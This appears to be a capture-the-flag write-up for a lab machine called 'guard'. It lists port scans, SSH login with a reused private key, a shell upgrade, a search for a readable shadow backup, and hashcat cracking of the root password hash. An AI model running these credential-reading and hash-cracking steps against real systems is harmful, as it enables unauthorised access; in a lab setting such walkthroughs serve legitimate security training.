* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.50 -e tun0 --rate=1000  
![alt text](./img/guard01.PNG?raw=true)  

nmap -A -p 22 10.10.10.50  
![alt text](./img/guard02.PNG?raw=true)  

## Exploit  
Since we have another ssh port, let’s try to connect it with the same command from the MARKUP machine
ssh daniel@10.10.10.50 -i id_rsa_daniel  
![alt text](./img/guard03.PNG?raw=true)  
  
HABEMUS SHELL \o/
BUT, if we try to user the auto-complete from the shell or even read the user.txt flag we have problems…  
![alt text](./img/guard04.PNG?raw=true)  

However this is easy, just run the following command:  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
![alt text](./img/guard05.PNG?raw=true)  

## Privesc  
Here our user can run sudo commands  
![alt text](./img/guard06.PNG?raw=true)  

Let’s search for files with the S permission
find / -perm -u=s 2>/dev/null  
![alt text](./img/guard07.PNG?raw=true)  
  
Nothing really useful

Let’s search some backups folders  
find / -name \*backup\* 2>/dev/null  
![alt text](./img/guard08.PNG?raw=true)  

Ok, that /var/backups can be useful  
![alt text](./img/guard09.PNG?raw=true)  

Wow, shadow? And readable? Ok….  
![alt text](./img/guard10.PNG?raw=true)  

Now we copy the root hash to a hash.txt file and use hashcat to break it
hashcat -m 1800 -o cracked hash.txt ~/wordlists/rockyou.txt  
![alt text](./img/guard11.PNG?raw=true)  

Now let’s try to log as root  
![alt text](./img/guard12.PNG?raw=true)  

Go to the /root folder and get the flag

## Discoveries  
